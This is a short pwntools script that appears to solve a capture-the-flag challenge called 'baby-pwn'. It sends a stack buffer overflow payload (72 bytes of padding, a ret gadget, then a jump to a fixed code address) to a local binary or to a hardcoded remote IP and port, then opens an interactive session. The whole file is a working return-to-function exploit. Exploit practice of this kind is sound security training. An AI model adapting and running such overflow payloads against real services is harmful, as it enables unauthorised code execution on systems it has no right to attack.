#!/usr/bin/env python3
# Local Ubuntu 22.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./baby-pwn"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.162.142.123"
  PORT = 5000
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

ret_addr = 0x40101a #: ret;

buf  = b"A"*72
buf += p64(ret_addr)
buf += p64(0x401166)
s.sendlineafter(b"text: ", buf)
  
s.interactive()   
